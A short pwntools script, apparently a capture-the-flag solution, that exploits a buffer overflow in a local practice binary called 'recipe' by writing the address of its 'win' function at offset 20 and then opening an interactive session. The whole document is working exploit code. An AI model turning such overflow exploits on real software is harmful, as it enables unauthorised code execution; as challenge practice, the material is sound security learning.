from pwn import *

PROG_NAME = "./recipe"
LOCAL_LIBC = "/lib/i386-linux-gnu/libc.so.6"
p = process(PROG_NAME)
elf = p.elf
libc = ELF(LOCAL_LIBC)

if args.ATTACH:
	gdb.attach(p, '''break main''')

p.sendline(flat({20: p32(elf.symbols['win'])}))



p.interactive()